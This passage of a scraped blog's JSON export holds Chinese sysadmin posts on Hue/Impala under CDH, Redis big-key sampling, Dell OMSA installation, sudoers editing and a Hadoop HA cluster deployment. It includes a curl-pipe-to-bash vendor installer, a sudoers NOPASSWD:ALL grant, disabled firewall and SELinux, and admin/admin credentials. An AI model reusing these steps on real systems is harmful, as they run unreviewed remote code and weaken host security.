&gt;&gt;&#x2F;etc&#x2F;rc.d&#x2F;rc.localchmod +x &#x2F;etc&#x2F;rc.d&#x2F;rc.local Web访问1234http:&#x2F;&#x2F;hue_server:8000直接输入任意账号密码，系统会提示创建该账号并作为管理员。admin &#x2F; admin 到此，Hue部署九完成了，Hue接入Hive和Hbase也是修改hue.ini文件，在对应模块下配置Hive或Hbase连接地址即可。 如果Hue是在CDH中部署，对接外部Impala注意事项和方法如下1CDH中，Hue真正生效的配置文件是 &#x2F;var&#x2F;run&#x2F;cloudera-scm-agent&#x2F;process&#x2F;XXX-hue-HUE_SERVER目录下的hue.ini, 该文件由cloudera-scm-agent客户端下发，故不能直接修改此文件。 对接Impala方法 123CDH ---&gt; HUE集群 ---&gt; 配置 ---&gt;高级---&gt; 修改“hue_safety_valve.ini 的 Hue服务高级配置代码段（安全阀）”区域，直接添加Impala配置。此处的配置，当重启Hue后，将重新下发到Hue服务器的&#x2F;var&#x2F;run&#x2F;cloudera-scm-agent&#x2F;process&#x2F;XXX-hue-HUE_SERVER目录中的hue_safety_valve.ini文件中，这样就ok了。如下图 1最后，逐一重启Hue集群节点服务器，再次访问Hue Web平台 ---&gt; Impala ---&gt;即可看到Imala连接的后端KuDu集群数据库数据，此时就可以使用SQL语句进行查询了。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"CDH","slug":"CDH","permalink":"https://garywu520.github.io/tags/CDH/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Hue","slug":"Hue","permalink":"https://garywu520.github.io/tags/Hue/"},{"name":"Impala","slug":"Impala","permalink":"https://garywu520.github.io/tags/Impala/"},{"name":"Hive","slug":"Hive","permalink":"https://garywu520.github.io/tags/Hive/"},{"name":"Hbase","slug":"Hbase","permalink":"https://garywu520.github.io/tags/Hbase/"},{"name":"KuDu","slug":"KuDu","permalink":"https://garywu520.github.io/tags/KuDu/"}]},{"title":"统计Redis集群上比较大的key","slug":"统计Redis集群上比较大的key","date":"2019-01-03T04:12:50.000Z","updated":"2019-01-03T04:15:39.448Z","comments":true,"path":"2019/01/03/统计Redis集群上比较大的key/","link":"","permalink":"https://garywu520.github.io/2019/01/03/%E7%BB%9F%E8%AE%A1Redis%E9%9B%86%E7%BE%A4%E4%B8%8A%E6%AF%94%E8%BE%83%E5%A4%A7%E7%9A%84key/","excerpt":"","text":"1对redis中的key进行采样，寻找较大的keys。是用的是scan方式，不用担心会阻塞redis很长时间不能处理其他的请求。执行的结果可以用于分析redis的内存的只用状态，每种类型key的平均大小。 1redis-cli -h server_ip -p 6381 --bigkeys &gt;&gt; redis_bigkeys.log","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Redis","slug":"Redis","permalink":"https://garywu520.github.io/tags/Redis/"},{"name":"key 统计","slug":"key-统计","permalink":"https://garywu520.github.io/tags/key-%E7%BB%9F%E8%AE%A1/"},{"name":"redis_cli","slug":"redis-cli","permalink":"https://garywu520.github.io/tags/redis-cli/"}]},{"title":"Dell硬件管理-OMSA部署","slug":"Dell硬件管理-OMSA部署","date":"2018-12-27T09:29:25.000Z","updated":"2018-12-27T09:39:31.471Z","comments":true,"path":"2018/12/27/Dell硬件管理-OMSA部署/","link":"","permalink":"https://garywu520.github.io/2018/12/27/Dell%E7%A1%AC%E4%BB%B6%E7%AE%A1%E7%90%86-OMSA%E9%83%A8%E7%BD%B2/","excerpt":"1Dell的服务器管理工具 Dell OpenManager Server Administrator, 可以很方便的对Dell服务器进行集中硬件管理，它仅对DELL服务器有效。 参考官网：部署","text":"1Dell的服务器管理工具 Dell OpenManager Server Administrator, 可以很方便的对Dell服务器进行集中硬件管理，它仅对DELL服务器有效。 参考官网：部署 CentOS7 部署OMSA下载官方源 1curl -s http:&#x2F;&#x2F;linux.dell.com&#x2F;repo&#x2F;hardware&#x2F;dsu&#x2F;bootstrap.cgi | bash 安装OMSA【OpenManage Server Administrator】 12安装DSU(Dell EMC System Update)---DSU 是为操作更新驱动与软件的服务yum install -y dell-system-update 1234567891011121314安装OMSA，安装后重启系统，目的是重置Server Administrator CLI的PATH变量yum -y install srvadmin-all 安装路径在&#x2F;opt&#x2F;dell&#x2F;srvadmin下ln -sv &#x2F;opt&#x2F;dell&#x2F;srvadmin&#x2F;sbin&#x2F;* &#x2F;usr&#x2F;sbin&#x2F;启动服务&#x2F;opt&#x2F;dell&#x2F;srvadmin&#x2F;sbin&#x2F;srvadmin-services.sh start&#x2F;opt&#x2F;dell&#x2F;srvadmin&#x2F;sbin&#x2F;srvadmin-services.sh status验证端口启动netstat -nat | grep 1311将OMSA设置为开机启动&#x2F;opt&#x2F;dell&#x2F;srvadmin&#x2F;sbin&#x2F;srvadmin-services.sh enable Iptables开放1311端口 1略 Web访问OMSA123https:&#x2F;&#x2F;omsa_server_ip:1311账号和密码是CentOS7的系统账号密码 OMSA命令行界面-常用命令1234567查看OMSA版本[root@localhost ~]# omreport aboutProduct name : Dell EMC OpenManage Server AdministratorVersion : 9.2.0Copyright : Copyright (C) Dell Inc. 1995-2018 All rights reserved.Company : Dell Inc. 更多参考：Dell OpenManage Server Administrator 版本 7.3 命令行界面–指南 更新OMSA1yum --disablerepo&#x3D;* --enablerepo&#x3D;dell-system-update_dependent upgrade 卸载OMSA1&#x2F;opt&#x2F;dell&#x2F;srvadmin&#x2F;sbin&#x2F;srvadmin-uninstall.sh 安装DTK支持12345DTK组件包可用来升级指定服务器的BIOS版本yum install -y raidcfg* syscfg* dtk*ln -sv &#x2F;opt&#x2F;dell&#x2F;toolkit&#x2F;bin&#x2F;raidcfg &#x2F;usr&#x2F;sbin&#x2F;raidcfgln -sv &#x2F;opt&#x2F;dell&#x2F;toolkit&#x2F;bin&#x2F;syscfg &#x2F;usr&#x2F;sbin&#x2F;syscfg 监控1安装完OMSA后，可以通过访问 https:&#x2F;&#x2F;&lt;本机IP&gt;:000 通过浏览器的方式查看硬件信息，如果机器成百上千台，这种方式的工作效率是非常低的，因此本文介绍通过nagios插件 check_openmanage 的方式通过命令行检查，当然这个插件可以结合nagios和zabbix使用 下载check_openmanage 1wget http:&#x2F;&#x2F;folk.uio.no&#x2F;trondham&#x2F;software&#x2F;files&#x2F;check_openmanage-3.7.12.tar.gz 使用check_openmanage 123456789101112131415161718192021222324252627282930313233343536373839404142434445.&#x2F;check_openmanage -hUsage: check_openmanage [OPTION]...GENERAL OPTIONS: -f, --config Specify configuration file -p, --perfdata Output performance data [default&#x3D;no] -t, --timeout Plugin timeout in seconds [default&#x3D;30] -c, --critical Custom temperature critical limits -w, --warning Custom temperature warning limits -F, --fahrenheit Use Fahrenheit as temperature unit -d, --debug Debug output, reports everything -h, --help Display this help text -V, --version Display version infoSNMP OPTIONS: -H, --hostname Hostname or IP (required for SNMP) -C, --community SNMP community string [default&#x3D;public] -P, --protocol SNMP protocol version [default&#x3D;2c] --port SNMP port number [default&#x3D;161] -6, --ipv6 Use IPv6 instead of IPv4 [default&#x3D;no] --tcp Use TCP instead of UDP [default&#x3D;no]OUTPUT OPTIONS: -i, --info Prefix any alerts with the service tag -e, --extinfo Append system info to alerts -s, --state Prefix alerts with alert state -S, --short-state Prefix alerts with alert state abbreviated -o, --okinfo Verbosity when check result is OK -B, --show-blacklist Show blacklistings in OK output -I, --htmlinfo HTML output with clickable linksCHECK CONTROL AND BLACKLISTING: -a, --all Check everything, even log content -b, --blacklist Blacklist missing and&#x2F;or failed components --only Only check a certain component or alert type --check Fine-tune which components are checked --no-storage Don&#39;t check storage --vdisk-critical Make any alerts on virtual disks criticalFor more information and advanced options, see the manual page or URL: http:&#x2F;&#x2F;folk.uio.no&#x2F;trondham&#x2F;software&#x2F;check_openmanage.html 其他参考：salogs","categories":[],"tags":[{"name":"omsa","slug":"omsa","permalink":"https://garywu520.github.io/tags/omsa/"},{"name":"dtk","slug":"dtk","permalink":"https://garywu520.github.io/tags/dtk/"},{"name":"dell","slug":"dell","permalink":"https://garywu520.github.io/tags/dell/"}]},{"title":"linux sudoers文件详解","slug":"linux-sudoers文件详解","date":"2018-12-25T07:06:24.000Z","updated":"2019-03-25T10:57:15.624Z","comments":true,"path":"2018/12/25/linux-sudoers文件详解/","link":"","permalink":"https://garywu520.github.io/2018/12/25/linux-sudoers%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"如果linux系统安装的是minimal最小化版本，无/etc/sudoers文件怎么办？以CentOS为例： 12yum search sudoyum install -y sudo 以Gentoo为例： 1emerge --ask app-admin&#x2F;sudo 普通用户如何执行一个root权限的命令或执行一个文件 ,需要编辑/etc/sudoers文件, 编辑完毕, 输入”:wp!”保存 给普通用户添加命令执行权限1spark ALL&#x3D;(ALL) NOPASSWD:&#x2F;bin&#x2F;sz 让普通用户执行shell脚本1spark ALL&#x3D;(ALL) NOPASSWD:&#x2F;etc&#x2F;init.d&#x2F;nagios restart 将某个用户设置超管权限1spark ALL&#x3D;(ALL) NOPASSWD:ALL","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"linux","slug":"linux","permalink":"https://garywu520.github.io/tags/linux/"},{"name":"sudoers","slug":"sudoers","permalink":"https://garywu520.github.io/tags/sudoers/"},{"name":"linux特权控制","slug":"linux特权控制","permalink":"https://garywu520.github.io/tags/linux%E7%89%B9%E6%9D%83%E6%8E%A7%E5%88%B6/"},{"name":"su","slug":"su","permalink":"https://garywu520.github.io/tags/su/"},{"name":"sudo","slug":"sudo","permalink":"https://garywu520.github.io/tags/sudo/"},{"name":"nopasswd","slug":"nopasswd","permalink":"https://garywu520.github.io/tags/nopasswd/"}]},{"title":"Hadoop HA 2.7.3完全分布式集群部署-终极版","slug":"Hadoop HA 2.7.3完全分布式集群部署-终极版","date":"2018-12-19T06:23:40.000Z","updated":"2019-03-20T10:22:35.634Z","comments":true,"path":"2018/12/19/Hadoop HA 2.7.3完全分布式集群部署-终极版/","link":"","permalink":"https://garywu520.github.io/2018/12/19/Hadoop%20HA%202.7.3%E5%AE%8C%E5%85%A8%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2-%E7%BB%88%E6%9E%81%E7%89%88/","excerpt":"HDFS-NameNode(NN) HA 实现方式Hadoop 从2.0版本通过基于zookeeper实现了高可用 (High Availability, HA)。QJM（Qurom Journal Manager）是当前主流HDFS NameNode HA方案。故本讲也是使用QJM实现HA QJM 的基本原理： Active NameNode（ANN） 1在HDFS集群中，对外提供读写服务的唯一Master节点。ANN将客户端请求过来的写操作通过EditLog写入共享存储系统（即JournalNode Cluster），为Standby NameNode及时同步数据提供支持； Standby NameNode（SBN） 1与ANN相互形成热备，SBN及时从共享存储系统中读取EditLog数据并更新内存，以保证当前状态尽可能与ANN同步。当前在整个HDFS集群中最多一台处于Active状态，最多一台处于Standby状态； JournalNode Cluster（JNs） 1ANN与SBN之间共享Editlog的一致性存储系统，是HDFS NameNode高可用的核心组件。借助JournalNode集群ANN可以尽可能及时同步元数据到SBN。其中ANN采用Push模式将EditLog写入JN，SBN通过Pull模式从JN拉取数据，整个过程中JN不主动进行数据交换； ZKFiloverController（ZKFC） 1ZKFailoverController以独立进程运行，对NameNode主备切换进行控制，正常情况ANN和SBN分别对应各自ZKFC进程。ZKFC主要功能：NameNode健康状况检测；借助Zookeeper实现NameNode自动选主；操作NameNode进行主从切换； Zookeeper（ZK） 1为ZKFC实现自动选主功能提供统一协调服务。 YARN-ResourceManager(RM) HA实现方式ResourceManager(RM) HA 实现方式： RM 将状态信息存储在 Zookeeper 中，当 Active 故障，Standby 切换为 Active 后， 从 ZK 读取相应的作业信息，重新构建作业的内存信息，然后开始接受 NodeManager 心 跳，并接受客户端提交作业的请求等。","text":"HDFS-NameNode(NN) HA 实现方式Hadoop 从2.0版本通过基于zookeeper实现了高可用 (High Availability, HA)。QJM（Qurom Journal Manager）是当前主流HDFS NameNode HA方案。故本讲也是使用QJM实现HA QJM 的基本原理： Active NameNode（ANN） 1在HDFS集群中，对外提供读写服务的唯一Master节点。ANN将客户端请求过来的写操作通过EditLog写入共享存储系统（即JournalNode Cluster），为Standby NameNode及时同步数据提供支持； Standby NameNode（SBN） 1与ANN相互形成热备，SBN及时从共享存储系统中读取EditLog数据并更新内存，以保证当前状态尽可能与ANN同步。当前在整个HDFS集群中最多一台处于Active状态，最多一台处于Standby状态； JournalNode Cluster（JNs） 1ANN与SBN之间共享Editlog的一致性存储系统，是HDFS NameNode高可用的核心组件。借助JournalNode集群ANN可以尽可能及时同步元数据到SBN。其中ANN采用Push模式将EditLog写入JN，SBN通过Pull模式从JN拉取数据，整个过程中JN不主动进行数据交换； ZKFiloverController（ZKFC） 1ZKFailoverController以独立进程运行，对NameNode主备切换进行控制，正常情况ANN和SBN分别对应各自ZKFC进程。ZKFC主要功能：NameNode健康状况检测；借助Zookeeper实现NameNode自动选主；操作NameNode进行主从切换； Zookeeper（ZK） 1为ZKFC实现自动选主功能提供统一协调服务。 YARN-ResourceManager(RM) HA实现方式ResourceManager(RM) HA 实现方式： RM 将状态信息存储在 Zookeeper 中，当 Active 故障，Standby 切换为 Active 后， 从 ZK 读取相应的作业信息，重新构建作业的内存信息，然后开始接受 NodeManager 心 跳，并接受客户端提交作业的请求等。 规划 安装包版本以及功能 软件名 版本号 功能 Hadoop hadoop-2.7.3.tar.gz 为海量数据提供分布式存 储（HDFS）和分布式计算 (YARN)。 ZooKeeper zookeeper-3.4.10.tar.gz 一个分布式应用程序协调 服务，为应用提供一致性服 务 JDK jdk-8u201-linux-x64.tar.gz JAVA 运行环境 集群架构规划 IP 角色 ZooKeeper HostName 10.0.10.100 NameNode/ResourceManeger/nodemanager / ActiveNN 10.0.10.101 NameNode/ResourceManeger/nodemanager QuorumPeerMain StandbyNN 10.0.10.111 DataNode/JournalNode/nodemanager QuorumPeerMain slave1 10.0.10.112 DataNode/JournalNode/nodemanager QuorumPeerMain slave2 10.0.10.113 DataNode/JournalNode/nodemanager / slave3 基础环境准备[所有节点配置] 修改主机名 1# hostnamectl set-hostname [hostname] 修改Hosts 12345678# cat &#x2F;etc&#x2F;hosts#Hadoop HA Cluster10.0.10.100 ActiveNN10.0.10.101 StandbyNN10.0.10.111 Slave110.0.10.112 Slave210.0.10.113 Slave3 关闭防火墙 12systemctl stop firewalldsystemctl disable firewalld 关闭SELINUX 123456#临时setenfoce 0#永久-将enforcing 改为disabled# cat &#x2F;etc&#x2F;selinux&#x2F;config |grep -v &quot;#&quot;|grep disabledSELINUX&#x3D;disabled 配置NTP时间同步 123这里采用chrony。架构如下：master1和master2分别从亚洲标准时间进行同步；而slave1和slave2分别设置服务器为master1和master2 参考：Chrony部署 配置SSH免密登陆 1作用是后边Namenode HA隔离配置以及个别服务启动需要使用 所有节点都要重复此过程 123456789生成密钥对ssh-keygen复制公钥给集群中的所有主机(包括自己)ssh-copy-id root@ActiveNNssh-copy-id root@StandbyNNssh-copy-id root@Slave1ssh-copy-id root@Slave2ssh-copy-id root@Slave3 设置透明大页面 1Transparent Hugepage如果开启，可能会严重降低Hadoop集群性能,CentOS7默认启用 查看当前是否启用 1234# cat &#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;enabled[always] madvise never 表示已启用always madvise [never] 表示已禁用 禁用Transparent Hugepage(重启生效) 12345# vim &#x2F;etc&#x2F;rc.d&#x2F;rc.localecho never &gt; &#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;defragecho never &gt; &#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;enabled#chmod +x &#x2F;etc&#x2F;rc.d&#x2F;rc.local 调整swap内核参数 1该值用于控制从物理内存到磁盘上的虚拟内存的应用数据的交换。值越高，内存交换越积极。值越低，交换的次数越少。大多数系统默认为60，但不适用于Hadoop集群，因为即使有足够的内存，Hadoop进程也有可能会被交换到磁盘，影响集群稳定性和性能。 查看当前参数 1234# cat &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;swappiness30注：当前是30，建议设置为1-10之间，最好为1 设置vm.swappiness值为1 123456#临时生效#systemctl vm.swappiness&#x3D;1#重启生效#vim &#x2F;etc&#x2F;rc.d&#x2F;rc.localecho 1 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;swappiness 安装JDK 12345678910111213tar -zxf jdk-8u201-linux-x64.tar.gz -C &#x2F;optln -sv &#x2F;opt&#x2F;jdk1.8.0_201 &#x2F;opt&#x2F;jdk编辑配置文件#cat &#x2F;etc&#x2F;profile#JDKexport JAVA_HOME&#x3D;&#x2F;opt&#x2F;jdkexport PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin:$JAVA_HOME&#x2F;jre&#x2F;binexport CLASSPATH&#x3D;$JAVA_HOME&#x2F;lib:$JAVA_HOME&#x2F;jre&#x2F;lib使配置文件生效#source &#x2F;etc&#x2F;profile#java -version Zookeeper集群部署[在3台zk节点部署]12tar -zxf zookeeper-3.4.10.tar.gz -C &#x2F;optln -sv &#x2F;opt&#x2F;zookeeper-3.4.10 &#x2F;opt&#x2F;zookeeper 12345cat &#x2F;etc&#x2F;profile#zookeeperexport ZOOKEEPER_HOME&#x3D;&#x2F;opt&#x2F;zookeeperexport PATH&#x3D;$PATH:$ZOOKEEPER_HOME&#x2F;bin 配置zookeeper集群 12345mkdir -p &#x2F;opt&#x2F;zookeeper&#x2F;datamkdir -p &#x2F;var&#x2F;log&#x2F;zookeepercp &#x2F;opt&#x2F;zookeeper&#x2F;zoo_sample.cfg &#x2F;opt&#x2F;zookeeper&#x2F;zoo.cfgchown -R root.root &#x2F;opt&#x2F;zookeeper&#x2F;datachown -R root.root &#x2F;var&#x2F;log&#x2F;zookeeper 编辑配置文件zoo.cfg 123456dataDir&#x3D;&#x2F;opt&#x2F;zookeeper&#x2F;dataclientPort&#x3D;2181dataLogDir&#x3D;&#x2F;var&#x2F;log&#x2F;zookeeperserver.1&#x3D; 10.0.10.111:2888:3888server.2&#x3D; 10.0.10.112:2888:3888server.3&#x3D; 10.0.10.113:2888:3888 分别创建ServerID标识 12345[root@slave1 ~]# echo &quot;1&quot; &gt; &#x2F;opt&#x2F;zookeeper&#x2F;data&#x2F;myid[root@slave2 ~]# echo &quot;2&quot; &gt; &#x2F;opt&#x2F;zookeeper&#x2F;data&#x2F;myid[root@slave3 ~]# echo &quot;3&quot; &gt; &#x2F;opt&#x2F;zookeeper&#x2F;data&#x2F;myid注：zookeeper集群模式需要配置一个myid文件【不可重复】,这个文件需要放在data目录下。 分别启动zookeeper 123[root@slave1 ~]# &#x2F;opt&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh start[root@slave2 ~]# &#x2F;opt&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh start[root@slave3 ~]# &#x2F;opt&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh start 123自启动zookeeperecho &quot;nohup &#x2F;opt&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh start 2&gt;&amp;1 &amp;&quot; &gt;&gt;&#x2F;etc&#x2F;rc.d&#x2F;rc.localchmod +x &#x2F;etc&#x2F;rc.d&#x2F;rc.local 查看zookeeper集群状态 12345678[root@slave1 ~]# &#x2F;opt&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh statusMode: follower[root@slave2 ~]# &#x2F;opt&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh statusMode: follower[root@slave3 ~]# &#x2F;opt&#x2F;zookeeper&#x2F;bin&#x2F;zkServer.sh statusMode: leader 测试zookeeper集群 1234[root@slave1 data]# jps -m2148 QuorumPeerMain &#x2F;opt&#x2F;zookeeper&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfgzookeeper启动后会出现一个QuorumPeerMain的进程 1234[root@slave1 ~]# &#x2F;opt&#x2F;zookeeper&#x2F;bin&#x2F;zkCli.sh -server 10.0.10.113:2181[zk: 10.0.10.113:2181(CONNECTED) 0] ls &#x2F;[zookeeper][zk: 10.0.10.113:2181(CONNECTED) 1] Hadoop HA集群部署[每台节点同样的安装与配置]安装与配置 12tar -zxf hadoop-2.7.3.tar.gz -C &#x2F;optln -sv &#x2F;opt&#x2F;hadoop-2.7.3 &#x2F;opt&#x2F;hadoop 修改hadoop命令环境变量/etc/profile 1234567#Hadoopexport HADOOP_HOME&#x3D;&#x2F;opt&#x2F;hadoopexport PATH&#x3D;$PATH:$HADOOP_HOME&#x2F;binexport PATH&#x3D;$PATH:$HADOOP_HOME&#x2F;sbinexport HADOOP_CONF_DIR&#x3D;$&#123;HADOOP_HOME&#125;&#x2F;etc&#x2F;hadoopexport HADOOP_HDFS_HOME&#x3D;$&#123;HADOOP_HOME&#125;export HADOOP_YARN_HOME&#x3D;$&#123;HADOOP_HOME&#125; 修改配置文件1cd &#x2F;opt&#x2F;hadoop&#x2F;etc&#x2F;hadoop hadoop-env.sh 12将“export JAVA_HOME&#x3D;$&#123;JAVA_HOME&#125;” 修改为自己的JDK安装路径export JAVA_HOME&#x3D;&#x2F;opt&#x2F;jdk core-site.xml 1234567891011121314151617181920212223242526272829&lt;configuration&gt;&lt;!--定义NameSpace名字为nn,注意不支持下划线--&gt;&lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://nn/&lt;/value&gt;&lt;/property&gt;&lt;!--指定Hadoop临时目录,目录提前创建--&gt;&lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;/opt/hadoop/tmp&lt;/value&gt;&lt;/property&gt;&lt;!--配置回收站-被删除文件在回收站保留1天，1天后清空--&gt;&lt;property&gt; &lt;name&gt;fs.trash.interval&lt;/name&gt; &lt;value&gt;1440&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;fs.trash.checkpoint.interval&lt;/name&gt; &lt;value&gt;1440&lt;/value&gt;&lt;/property&gt;&lt;!--以下是HDFS HA的配置--&gt;&lt;property&gt; &lt;name&gt;ha.zookeeper.quorum&lt;/name&gt; &lt;value&gt;Slave1:2181,Slave2:2181,Slave3:2181&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt; 修改hdfs-site.xml 说明：每个节点均新挂了块100GB磁盘用于HDFS数据存储,挂载目录为/data/A 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110&lt;configuration&gt;&lt;!--以下是HDFS副本数量--&gt;&lt;property&gt; &lt;name&gt;dfs.replication&lt;&#x2F;name&gt; &lt;value&gt;3&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--启用hdfs权限检查--&gt;&lt;property&gt; &lt;name&gt;dfs.permissions&lt;&#x2F;name&gt; &lt;value&gt;true&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--启用Web访问HDFS--&gt;&lt;property&gt; &lt;name&gt;dfs.webhdfs.enabled&lt;&#x2F;name&gt; &lt;value&gt;true&lt;&#x2F;value&gt;&lt;&#x2F;property&gt; &lt;!--以下是HDFS Namenode数据存储目录,目录提前创建--&gt;&lt;!--Slave节点不需要此配置--&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;&#x2F;name&gt; &lt;value&gt;&#x2F;data&#x2F;A&#x2F;namenode&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--以下是datanode数据存储目录，目录提前创建--&gt;&lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;&#x2F;name&gt; &lt;value&gt;&#x2F;data&#x2F;A&#x2F;datanode&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--以下是HDFS HA的配置--&gt;&lt;!--指定HDFS的nameservices名称为nn,需要和core-site.xml中保持一致--&gt;&lt;property&gt; &lt;name&gt;dfs.nameservices&lt;&#x2F;name&gt; &lt;value&gt;nn&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--指定mycluster的两个NameNode的名称分别为ActiveNN和StandbyNN--&gt;&lt;property&gt; &lt;name&gt;dfs.ha.namenodes.nn&lt;&#x2F;name&gt; &lt;value&gt;ActiveNN,StandbyNN&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--配置ActiveNN和StandbyNN的rpc通信端口--&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.rpc-address.nn.ActiveNN&lt;&#x2F;name&gt; &lt;value&gt;ActiveNN:9000&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.rpc-address.nn.StandbyNN&lt;&#x2F;name&gt; &lt;value&gt;StandbyNN:9000&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--配置ActiveNN和StandbyNN的http通信端口--&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.http-address.nn.ActiveNN&lt;&#x2F;name&gt; &lt;value&gt;ActiveNN:50070&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.http-address.nn.StandbyNN&lt;&#x2F;name&gt; &lt;value&gt;StandbyNN:50070&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--指定NameNode的元数据在JournalNode上的存放位置--&gt;&lt;!--为了安全考虑，JournalNode节点为三台slave节点--&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.shared.edits.dir&lt;&#x2F;name&gt; &lt;value&gt;qjournal:&#x2F;&#x2F;Slave1:8485;Slave2:8485;Slave3:8485&#x2F;nn&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--JournalNode上元数据和日志文件存放位置--&gt;&lt;!--JournalNode节点需要提前创建该目录--&gt;&lt;property&gt; &lt;name&gt;dfs.journalnode.edits.dir&lt;&#x2F;name&gt; &lt;value&gt;&#x2F;data&#x2F;A&#x2F;hadoop&#x2F;journal&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--开启NameNode失败自动切换--&gt;&lt;property&gt; &lt;name&gt;dfs.ha.automatic-failover.enabled&lt;&#x2F;name&gt; &lt;value&gt;true&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--NameNode失败自动切换实现方式--&gt;&lt;property&gt; &lt;name&gt;dfs.client.failover.proxy.provider.nn&lt;&#x2F;name&gt; &lt;value&gt;org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--隔离机制方式，确保任何时间只有一个NameNode处于活动状态--&gt;&lt;property&gt; &lt;name&gt;dfs.ha.fencing.methods&lt;&#x2F;name&gt; &lt;value&gt;sshfence shell(&#x2F;bin&#x2F;true)&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--使用sshfence隔离机制需要SSH免密码认证--&gt;&lt;!--注：此处指的是ActiveNN节点的这个文件,其他节点没此文件--&gt;&lt;property&gt; &lt;name&gt;dfs.ha.fencing.ssh.private-key-files&lt;&#x2F;name&gt; &lt;value&gt;&#x2F;root&#x2F;.ssh&#x2F;id_rsa&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--配置sshfence隔离机制超时时间--&gt;&lt;property&gt; &lt;name&gt;dfs.ha.fencing.ssh.connect-timeout&lt;&#x2F;name&gt; &lt;value&gt;30000&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;&#x2F;configuration&gt; mapred-site.xml 复制mapred-site.xml.template为mapred-site.xml 12345678910111213141516171819202122232425&lt;configuration&gt;&lt;!--执行框架设置为Hadoop YARN--&gt;&lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;&#x2F;name&gt; &lt;value&gt;yarn&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--启用针对MR小作业优化机制--&gt;&lt;property&gt; &lt;name&gt;mapreduce.job.ubertask.enable&lt;&#x2F;name&gt; &lt;value&gt;true&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--配置MapReduce JobHistory Server地址，默认端口10020--&gt;&lt;property&gt; &lt;name&gt;mapreduce.jobhistory.address&lt;&#x2F;name&gt; &lt;value&gt;0.0.0.0:10020&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--配置MapReduce JobHistory Server HTTP地址，默认端口19888--&gt;&lt;property&gt; &lt;name&gt;mapreduce.jobhistory.webapp.address&lt;&#x2F;name&gt; &lt;value&gt;0.0.0.0:19888&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;&#x2F;configuration&gt; 12345678注：启动historyserver： &#x2F;opt&#x2F;hadoop&#x2F;sbin&#x2F;mr-jobhistory-daemon.sh start historyserver 停止historyserver： &#x2F;opt&#x2F;hadoop&#x2F;sbin&#x2F;mr-jobhistory-daemon.sh sop historyserver jobhistoryserver的webUI地址：主机名:19888 当我们启动jobhistoryserver服务之后，在HDFS上&#x2F;tmp&#x2F;hadoop-yarn&#x2F;staging&#x2F;history路径下会生成两个文件夹：done和done_intermediate。done文件夹下存放已经完成的job，done_intermediate文件夹下存放正在进行的job信息。 yarn-site.xml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;configuration&gt;&lt;!--启用RM高可用--&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.enabled&lt;&#x2F;name&gt; 